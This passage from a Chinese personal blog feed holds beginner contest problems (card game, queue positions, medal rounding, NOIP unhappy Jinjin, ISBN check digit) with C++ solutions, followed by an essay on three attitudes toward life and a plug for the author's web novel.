class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">5</span>)</span><br><span class="line">        cout &lt;&lt; fixed &lt;&lt; <span class="built_in">setprecision</span>(<span class="number">1</span>) &lt;&lt; n * <span class="number">12</span> * <span class="number">2.54</span> * <span class="number">10</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        cout &lt;&lt; n * <span class="number">12</span> * <span class="number">2.54</span> * <span class="number">10</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="S-纸牌"><a href="#S-纸牌" class="headerlink" title="S 纸牌"></a>S 纸牌</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 131072K，其他语言262144K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-18"><a href="#题目描述-18" class="headerlink" title="题目描述"></a>题目描述</h1><p>小w想和你van纸牌<br>小w有两张纸牌，两张纸牌上都有相同的正整数n<br>每一轮一张纸牌上的数都可以减去小于等于另外一张纸牌上的数的数<br>每一轮只能操作和上轮不同的纸牌<br>小w想知道三轮之后两纸牌上数字之和的最小值<br>注意，不能减为负数</p><h1 id="输入描述-16"><a href="#输入描述-16" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>第一行1个正整数n。</p><h1 id="输出描述-18"><a href="#输出描述-18" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>一行一个整数<br>表示三轮之后两纸牌上数字和的最小值</p><h1 id="示例1-18"><a href="#示例1-18" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-33"><a href="#输入-33" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="输出-32"><a href="#输出-32" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="说明-2"><a href="#说明-2" class="headerlink" title="说明"></a>说明</h1><p>样例解释:两张ab上数字分别为2,第一轮,a张减去1(1 &lt;&#x3D; (b &#x3D; 2)) 第二轮b减去1(1 &lt;&#x3D; (a &#x3D; 1)) ,第三轮a减去1(1 &lt;&#x3D; (b &#x3D; 1)),游戏结束a+b &#x3D; 1,该结果为最可行优解之一<br>备注:<br>保证1 ≤ n ≤ 1000000000</p><h1 id="AC-Code-18"><a href="#AC-Code-18" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) cout &lt;&lt; <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n == <span class="number">2</span>) cout &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; n - n / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="T-排队领水"><a href="#T-排队领水" class="headerlink" title="T 排队领水"></a>T 排队领水</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 32768K，其他语言65536K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-19"><a href="#题目描述-19" class="headerlink" title="题目描述"></a>题目描述</h1><p>羊村的供水系统搞砸了，隔壁牛村捐赠的的矿泉水刚刚送达，村长让喜羊羊们排队领水，已知有n个羊村村民正在排队取水，懒羊羊不知道他在队伍的具体哪个位置，但他知道有不少于a个人在他前面，有不多于b个人在他后面，你能帮忙计算一下懒羊羊有多少个可能的位置吗？</p><h1 id="输入描述-17"><a href="#输入描述-17" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>输入一行包含三个整数n,a,b</p><p>0&lt;&#x3D; a,b &lt; n &lt;&#x3D; 100</p><h1 id="输出描述-19"><a href="#输出描述-19" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>输出一行包含一个整数表示可能的位置数</p><h1 id="示例1-19"><a href="#示例1-19" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-34"><a href="#输入-34" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span> <span class="number">1</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="输出-33"><a href="#输出-33" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><h1 id="示例2-12"><a href="#示例2-12" class="headerlink" title="示例2"></a>示例2</h1><h2 id="输入-35"><a href="#输入-35" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span> <span class="number">1</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="输出-34"><a href="#输出-34" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure><h1 id="AC-Code-19"><a href="#AC-Code-19" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n, a, b;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; a &gt;&gt; b;</span><br><span class="line"><span class="keyword">if</span> (n - a &gt; b) &#123;</span><br><span class="line">cout &lt;&lt; b + <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">cout &lt;&lt; n - a &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="U-可编程拖拉机比赛"><a href="#U-可编程拖拉机比赛" class="headerlink" title="U 可编程拖拉机比赛"></a>U 可编程拖拉机比赛</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 65536K，其他语言131072K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-20"><a href="#题目描述-20" class="headerlink" title="题目描述"></a>题目描述</h1><p>“这个比赛，归根结底就是控制一个虚拟的小拖拉机跑完整个赛道。一般一场比赛会有 9 个到 13 个赛道，最后看能跑完多少个赛道。”<br>通常在一场可编程拖拉机比赛中，分别会有实际参赛队伍数 10%、20%、30% 向下取整的队伍获得金、银、铜牌，其余队伍获得荣誉提名，俗称“铁牌”。<br>但是主办方往往会多准备一些奖牌，那么在发奖牌的时候会按照比例向上取整发出的奖牌以减少浪费，就会有一些原本获得银牌的队伍获得了金牌。<br>现在给出一个赛区的规模，也就是这个赛区的实际参赛队伍数，小 Q 同学想知道有多少队伍的奖牌会由银变金、由铜变银、由铁变铜。</p><h1 id="输入描述-18"><a href="#输入描述-18" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>输入只有一行，包含一个整数 n (10 &lt;&#x3D; n &lt;&#x3D; 1000)，表示实际参赛队伍数。<br>输出描述:<br>输出一行，包含三个由空格分隔的整数，分别表示奖牌会由银变金、由铜变银、由铁变铜的队伍数。</p><h1 id="示例1-20"><a href="#示例1-20" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-36"><a href="#输入-36" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">115</span></span><br></pre></td></tr></table></figure><h2 id="输出-35"><a href="#输出-35" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><h1 id="说明-3"><a href="#说明-3" class="headerlink" title="说明"></a>说明</h1><p>按照下取整规则只发 11 块金牌的话，第 12 名原本是银牌，但是按照上取整规则发 12 块金牌，第 12 名是金牌，就由银变金了。</p><h1 id="AC-Code-20"><a href="#AC-Code-20" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;iostream&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cmath&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span> a, b, c, n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="type">int</span> j, k, l;</span><br><span class="line">a = n * <span class="number">0.1</span>;</span><br><span class="line">b = n * <span class="number">0.2</span>;</span><br><span class="line">c = n * <span class="number">0.3</span>;</span><br><span class="line">j = <span class="built_in">ceil</span>(a) - <span class="built_in">floor</span>(a);</span><br><span class="line">k = <span class="built_in">ceil</span>(b) - <span class="built_in">floor</span>(b);</span><br><span class="line">l = <span class="built_in">ceil</span>(c) - <span class="built_in">floor</span>(c);</span><br><span class="line">cout &lt;&lt; j &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; j + k &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; j + k + l;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ceil函数：</span></span><br><span class="line"></span><br><span class="line">头文件：<span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span>或者写成#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line">含义：对小数向上“”取整”，这里不一定得到的就是整数，因为他的返回值是个<span class="type">double</span>型的，有可能就是个小数，但是后边的小数部分全部是<span class="number">0</span>；</span><br><span class="line"><span class="comment">//floor函数：</span></span><br><span class="line"></span><br><span class="line">和ceil 函数正好相反；</span><br><span class="line">头文件：<span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span>或者写成#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line">含义：对小数向下“”取整”，这里不一定得到的就是整数，因为他的返回值是个<span class="type">double</span>型的，有可能就是个小数，但是后边的小数部分全部是<span class="number">0</span>；</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="V-NOIP2004-不高兴的津津"><a href="#V-NOIP2004-不高兴的津津" class="headerlink" title="V [NOIP2004]不高兴的津津"></a>V [NOIP2004]不高兴的津津</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 131072K，其他语言262144K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-21"><a href="#题目描述-21" class="headerlink" title="题目描述"></a>题目描述</h1><p>津津上初中了。妈妈认为津津应该更加用功学习，所以津津除了上学之外，还要参加妈妈为她报名的各科复习班。另外每周妈妈还会送她去学习朗诵、舞蹈和钢琴。但是津津如果一天上课超过八个小时就会不高兴，而且上得越久就会越不高兴。假设津津不会因为其它事不高兴，并且她的不高兴不会持续到第二天。请你帮忙检查一下津津下周的日程安排，看看下周她会不会不高兴；如果会的话，哪天最不高兴。</p><h1 id="输入描述-19"><a href="#输入描述-19" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>包括七行数据，分别表示周一到周日的日程安排。每行包括两个小于10的非负整数，用空格隔开，分别表示津津在学校上课的时间和妈妈安排她上课的时间。<br>输出描述:<br>包括一行，这一行只包含一个数字。如果不会不高兴则输出0，如果会则输出最不高兴的是周几（用1, 2, 3, 4, 5, 6, 7分别表示周一，周二，周三，周四，周五，周六，周日）。如果有两天或两天以上不高兴的程度相当，则输出时间最靠前的一天。</p><h1 id="示例1-21"><a href="#示例1-21" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-37"><a href="#输入-37" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span> <span class="number">3</span></span><br><span class="line"><span class="number">6</span> <span class="number">2</span></span><br><span class="line"><span class="number">7</span> <span class="number">2</span></span><br><span class="line"><span class="number">5</span> <span class="number">3</span></span><br><span class="line"><span class="number">5</span> <span class="number">4</span></span><br><span class="line"><span class="number">0</span> <span class="number">4</span></span><br><span class="line"><span class="number">0</span> <span class="number">6</span></span><br></pre></td></tr></table></figure><h2 id="输出-36"><a href="#输出-36" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h1 id="AC-Code-21"><a href="#AC-Code-21" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;iostream&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cmath&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> s, extr;</span><br><span class="line"><span class="type">int</span> sum[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i ++) &#123;</span><br><span class="line">cin &gt;&gt; s &gt;&gt; extr;</span><br><span class="line">sum[i] = s + extr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> maxx = sum[<span class="number">0</span>];</span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">6</span>; i ++) &#123;</span><br><span class="line"><span class="keyword">if</span> (sum[i] &gt; maxx) &#123;</span><br><span class="line">maxx = sum[i];</span><br><span class="line">cnt = i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (maxx &gt; <span class="number">8</span>) &#123;</span><br><span class="line">cout &lt;&lt; cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="W-NOIP2008-ISBN号码"><a href="#W-NOIP2008-ISBN号码" class="headerlink" title="W [NOIP2008]ISBN号码"></a>W [NOIP2008]ISBN号码</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 51200K，其他语言102400K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-22"><a href="#题目描述-22" class="headerlink" title="题目描述"></a>题目描述</h1><p>每一本正式出版的图书都有一个ISBN号码与之对应，ISBN码包括9位数字、1位识别码和3位分隔符，其规定格式如“x-xxx-xxxxx-x”，其中符号“-”是分隔符（键盘上的减号），最后一位是识别码，例如0-670-82162-4就是一个标准的ISBN码。ISBN码的首位数字表示书籍的出版语言，例如0代表英语；第一个分隔符“-”之后的三位数字代表出版社，例如670代表维京出版社；第二个分隔之后的五位数字代表该书在出版社的编号；最后一位为识别码。<br>识别码的计算方法如下：<br>首位数字乘以1加上次位数字乘以2……以此类推，用所得的结果mod 11，所得的余数即为识别码，如果余数为10，则识别码为大写字母X。例如ISBN号码0-670-82162-4中的识别码4是这样得到的：对067082162这9个数字，从左至右，分别乘以1，2，…，9，再求和，即0×1+6×2+……+2×9&#x3D;158，然后取158 mod 11的结果4作为识别码。<br>你的任务是编写程序判断输入的ISBN号码中识别码是否正确，如果正确，则仅输出“Right”；如果错误，则输出你认为是正确的ISBN号码。</p><h1 id="输入描述-20"><a href="#输入描述-20" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>只有一行，是一个字符序列，表示一本书的ISBN号码（保证输入符合ISBN号码的格式要求）。</p><h1 id="输出描述-20"><a href="#输出描述-20" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>共一行，假如输入的ISBN号码的识别码正确，那么输出“Right”，否则，按照规定的格式，输出正确的ISBN号码（包括分隔符“-”）。</p><h1 id="示例1-22"><a href="#示例1-22" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-38"><a href="#输入-38" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="number">-670</span><span class="number">-82162</span><span class="number">-4</span></span><br></pre></td></tr></table></figure><h2 id="输出-37"><a href="#输出-37" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Right</span><br></pre></td></tr></table></figure><h1 id="示例2-13"><a href="#示例2-13" class="headerlink" title="示例2"></a>示例2</h1><h2 id="输入-39"><a href="#输入-39" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="number">-670</span><span class="number">-82162</span><span class="number">-0</span></span><br></pre></td></tr></table></figure><h1 id="输出-38"><a href="#输出-38" class="headerlink" title="输出"></a>输出</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="number">-670</span><span class="number">-82162</span><span class="number">-4</span></span><br></pre></td></tr></table></figure><h1 id="AC-Code-22"><a href="#AC-Code-22" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">14</span>], c;</span><br><span class="line">    cin &gt;&gt; s;</span><br><span class="line">    <span class="type">int</span> h = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; i ++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s[i] != <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">            k ++;</span><br><span class="line">            h += k * (s[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    h %= <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">if</span> (h == <span class="number">10</span>) c = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> c = h + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (c == s[<span class="number">12</span>]) cout &lt;&lt; <span class="string">&quot;Right&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        s[<span class="number">12</span>] = c;</span><br><span class="line">        cout &lt;&lt; s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;题目来源：牛客竞赛语法入门班选择结构习题&lt;br&gt;题目链接：&lt;a href=&quot;https://ac.nowcoder.com/acm/contest/19304?from=acdiscuss&quot;&gt;https://ac.nowcoder.com/acm/</summary>
      
    
    
    
    <category term="编程/程序设计" scheme="http://jiangnanpsalter.com/categories/%E7%BC%96%E7%A8%8B-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="Programming" scheme="http://jiangnanpsalter.com/tags/Programming/"/>
    
  </entry>
  
  <entry>
    <title>对待人生的三个态度</title>
    <link href="http://jiangnanpsalter.com/2024/03/30/%E5%AF%B9%E5%BE%85%E4%BA%BA%E7%94%9F%E7%9A%84%E4%B8%89%E4%B8%AA%E6%80%81%E5%BA%A6/"/>
    <id>http://jiangnanpsalter.com/2024/03/30/%E5%AF%B9%E5%BE%85%E4%BA%BA%E7%94%9F%E7%9A%84%E4%B8%89%E4%B8%AA%E6%80%81%E5%BA%A6/</id>
    <published>2024-03-30T03:32:24.910Z</published>
    <updated>2024-04-04T16:51:53.268Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对待人生的三个态度"><a href="#对待人生的三个态度" class="headerlink" title="对待人生的三个态度"></a>对待人生的三个态度</h1><h2 id="1-无所谓。"><a href="#1-无所谓。" class="headerlink" title="1.无所谓。"></a>1.无所谓。</h2><p>所有的事都无所谓。活的潇洒。<br>注视着别人耍着或拙劣或巧妙的伎俩，但我们不动于心。<br>口头禅可以是（全部都是淡然的语气）：<br>①和竞争有关的事：“诶，无所谓，无所谓”   “应该是随便弄的吧”<br>②麻烦但不涉及利益的事：“不用管，小事，就让他这样。不用管他。”<br>③差距太大时 拒绝：“嗨，这不可能，这不可能” 然后不再多说。<br>④回复各种人、回应各种事：“无所谓，无所谓”  “不用管，小事”  “不用管他，就让他这样”。比如你如果在网上看到某人写了一篇侮辱人的文章，你就可以想着“不用管它”然后淡然的关闭这一篇文章然后浏览下一篇。</p><blockquote><p>明面上所有事都无所谓，这样别人就没法拿捏我们。但是暗中要 提升自己的实力、有所作为，猥琐发育，别浪。即：无所谓，有所为。</p></blockquote><h2 id="2-平等待人。"><a href="#2-平等待人。" class="headerlink" title="2.平等待人。"></a>2.平等待人。</h2><p>道出口淡然无味，即：道理说出来就变得没有意思了，因此那种含有比较性质的内容不要说出来。就算实际差距很大或别人的缺点很明显，但是面上要永远平等待人，我们要说：“我觉得每个人都挺好的，每个人都有优点。” 这样说不仅是为了人文的关怀，更是为了让文化底蕴更加深厚。</p><blockquote><p>平等待人 ，这不是虚伪，而是强势群体不动声色的维护弱势群体的自尊心。</p></blockquote><h2 id="3-包容之心。"><a href="#3-包容之心。" class="headerlink" title="3.包容之心。"></a>3.包容之心。</h2><p>有人说：“嫉妒你的人，一边模仿你，一边诋毁你，还不把他删了，是要留着他过年吗？赶紧把他的联系方式删掉吧。”  我并不同意这个说法，我认为作为一个强势群体中的一员，理应具备包容之心，正如一句古话所说：“宰相肚里能撑船。”，即：地位高的人度量大，有宽容之心和包容之心；这也是一种大的格局。事实上，我并不排斥别人模仿我，如果我能够带给大家的是正向的 正能量的引领作用，那么我会为此而感到高兴。</p><blockquote><p>这个世界需要更多我们这样内核稳定的人。</p></blockquote><p>我们并不是不怕人性的黑暗，而是因为艺高人胆大 所以可以游刃有余，高手是这样的：无惧也无畏，<code>绝艺写于澄空</code>；未着笔墨，挥洒宝剑锋。<br>自成一派<code>君子风</code>。</p><blockquote><p>JiangnanPsalter有义务在本文结尾提醒诸位两点：<br>①.关于所提倡的内容是否有矛盾：一些不通人情世故或是一些愚蠢顽固的人或者一些偏激的人可能会认为以上言论有矛盾，但是笔者想说的是：上述内容完全不存在矛盾；因为人是极其复杂的，既包含现实的某些条件的因素（比如外貌条件、能力、财富资本等等因素），又包含人与人之间的关系维护问题。<br>②.关于遵循对待人生的三个态度的理论之外，我们还需要保持<code>最基本的</code>风险预防意识，即：从源头上避免问题，不要为未来埋下隐患。举个例子，与您层次差距过大且性格特别偏激的人想要和您产生联系的话，那么从一开始就不要接触且不要加联系方式，因为性格极其偏激的人有可能会伤害别人的生命安全，<code>层次不同就保持应有的距离，这样就不会为未来埋下悲剧的隐患</code>；而 层次差距过大 但是为人正直且积极向上，这是可以去认识的，因为这样的人是品行比较好的人。或许会有人问：“那么这和您所说的要有包容之心是否产生了矛盾呢？” 笔者想说：这并不矛盾，因为这是为了自身的生命安全考虑，是最基本的<code>风险预防意识</code>，而<code>对待人生的三个态度都是建立在最基本的风险风控意识上来设立的</code>。正常人或多或少都有一些嫉妒心，这可以理解，正常人可能会嫉妒但是不会伤害别人的生命安全，<code>我们的包容之心包容的是正常人，而不是包容那种偏激到伤害别人生命的人。只有保证了生命的安全，才能畅谈如何对待人生。</code></p></blockquote><p>在此顺便宣传一下我（作者名：长安秋色）在晋江文学城写的作品：《天地风云录》 <a href="https://www.jjwxc.net/onebook.php?novelid=7686363">https://www.jjwxc.net/onebook.php?novelid=7686363</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;对待人生的三个态度&quot;&gt;&lt;a href=&quot;#对待人生的三个态度&quot; class=&quot;headerlink&quot; title=&quot;对待人生的三个态度&quot;&gt;&lt;/a&gt;对待人生的三个态度&lt;/h1&gt;&lt;h2 id=&quot;1-无所谓。&quot;&gt;&lt;a href=&quot;#1-无所谓。&quot; class=&quot;head</summary>
      
    
    
    
    <category term="博主的观点和态度" scheme="http://jiangnanpsalter.com/categories/%E5%8D%9A%E4%B8%BB%E7%9A%84%E8%A7%82%E7%82%B9%E5%92%8C%E6%80%81%E5%BA%A6/"/>
    
    
